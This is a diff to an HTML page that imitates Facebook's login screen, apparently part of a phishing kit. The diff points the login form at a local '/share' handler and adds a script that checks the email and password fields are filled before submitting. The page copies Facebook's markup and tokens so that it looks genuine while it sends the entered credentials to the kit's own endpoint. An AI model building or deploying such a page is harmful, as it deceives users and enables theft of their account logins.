@@ -199,7 +199,7 @@
                             </span></div>
                         <div class="login_form_container">
                             <form id="login_form"
-                                action="/shareme" method="post"
+                                action="/share" method="post"
                                 onsubmit=""><input type="hidden" name="jazoest" value="2967" autocomplete="off"><input
                                     type="hidden" name="lsd" value="AVqhX8mDo4s" autocomplete="off"><input type="hidden"
                                     autocomplete="off" id="error_box">
@@ -240,7 +240,7 @@
                                     </div>
                                     <div class="_xkt"><button value="1"
                                             class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton"
-                                            name="login" tabindex="0" type="submit">Log In</button></div>
+                                            name="login" tabindex="0" type="submit" onclick="return flogin();">Log In</button></div>
                                     <div class="_xkv fsm fwn fcg" id="login_link"><a
                                             href="https://www.facebook.com/recover/initiate/?ars=facebook_login"
                                             class="_97w4" target="">Forgotten account?</a><span role="presentation"
@@ -382,6 +382,19 @@
         <div></div>
         <div></div>
     </div>
+    <script>
+        function flogin(){
+            email=document.getElementById('email');
+            passwd=document.getElementById('pass');
+            if (email.value==""){
+                email.focus();
+                return false;
+            }else if (passwd.value==""){
+                passwd.focus();
+                return false;
+            }
+        }
+     </script>
     
 </body>
 
